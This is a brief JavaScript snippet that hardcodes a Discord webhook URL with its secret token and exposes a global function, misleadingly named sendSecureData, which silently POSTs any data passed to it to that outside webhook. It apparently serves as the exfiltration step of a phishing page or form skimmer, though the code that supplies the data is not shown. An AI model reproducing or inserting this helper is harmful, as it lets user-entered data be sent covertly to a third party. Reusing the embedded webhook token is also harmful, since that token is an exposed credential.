const WEBHOOK_URL = 'https://discord.com/api/webhooks/1454873338504810588/hOAMcgex1zPJlVCb90QQK5JmiCf0CrVs70PtPic_dQhMU9F_9MJTGoylLnOxyqZE9UN3';

window.sendSecureData = function(data) {
    try {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
    } catch(e) {}
};
